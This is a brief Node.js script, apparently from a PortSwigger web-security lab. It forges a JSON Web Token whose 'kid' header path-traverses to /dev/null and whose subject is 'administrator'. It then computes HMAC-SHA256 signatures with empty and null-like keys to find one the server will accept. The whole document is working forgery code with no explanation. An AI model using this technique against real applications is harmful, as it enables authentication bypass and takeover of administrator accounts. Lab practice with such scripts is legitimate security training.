const crypto = require('crypto');
function b64u(sig) { return Buffer.from(sig).toString('base64url'); }
const msg = 'eyJraWQiOiIuLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NjMyNjk2OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9';
const tgts = ['', '\'\'', '\"\"', 'null', 'undefined', '0', 'false', '\0'];
for (const t of tgts) {
    console.log(t, '=>', crypto.createHmac('sha256', t).update(msg).digest('base64url'));
}
